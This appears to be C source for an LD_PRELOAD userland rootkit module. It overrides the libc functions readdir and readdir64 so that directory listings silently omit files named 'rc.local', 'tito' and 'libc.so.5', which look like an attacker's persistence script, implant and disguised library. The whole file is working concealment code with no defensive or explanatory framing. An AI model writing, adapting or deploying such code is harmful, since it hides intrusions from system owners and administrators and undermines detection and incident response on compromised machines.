#define _GNU_SOURCE
#include <dirent.h>
#include <string.h>
#include <dlfcn.h>
#include <stdlib.h>
#include <errno.h>
#include <stdint.h>

// List of files to hide
static const char *HIDE_NAMES[] = {
    "rc.local",
    "tito",
    "libc.so.5",
    NULL // Sentinel
};

// Helper function to check if a file should be hidden
static int libhide(const char *name) {
    for (int i = 0; HIDE_NAMES[i] != NULL; i++) {
        if (strcmp(name, HIDE_NAMES[i]) == 0) {
            return 1;
        }
    }
    return 0;
}

struct dirent *readdir(DIR *dirp) {
    static struct dirent *(*orig_readdir)(DIR *) = NULL;
    if (!orig_readdir) {
        //orig_readdir = dlsym(RTLD_NEXT, "readdir");
	orig_readdir = (struct dirent *(*)(DIR *))(uintptr_t)dlsym(RTLD_NEXT, "readdir");
        if (!orig_readdir) {
            errno = ENOSYS;
            return NULL;
        }
    }

    struct dirent *entry;
    while ((entry = orig_readdir(dirp)) != NULL) {
        if (libhide(entry->d_name)) {
            continue;
        }
        return entry;
    }
    return NULL;
}

struct dirent64 *readdir64(DIR *dirp) {
    static struct dirent64 *(*orig_readdir64)(DIR *) = NULL;
    if (!orig_readdir64) {
        //orig_readdir64 = dlsym(RTLD_NEXT, "readdir64");
	orig_readdir64 = (struct dirent64 *(*)(DIR *))(uintptr_t)dlsym(RTLD_NEXT, "readdir64");
        if (!orig_readdir64) {
            errno = ENOSYS;
            return NULL;
        }
    }

    struct dirent64 *entry;
    while ((entry = orig_readdir64(dirp)) != NULL) {
        if (libhide(entry->d_name)) {
            continue;
        }
        return entry;
    }
    return NULL;
}
